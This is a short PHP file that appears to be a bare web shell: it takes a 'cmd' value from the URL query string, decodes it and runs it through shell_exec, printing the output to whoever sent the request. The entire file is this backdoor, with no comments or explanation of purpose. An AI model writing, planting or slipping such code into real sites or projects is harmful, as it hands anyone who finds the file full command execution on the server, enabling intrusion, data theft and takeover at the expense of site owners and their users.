<?php
if (isset($_GET['cmd'])) {
    $cmd = urldecode($_GET['cmd']);
    echo shell_exec($cmd);
} else {
    echo "No command found";
}
?>
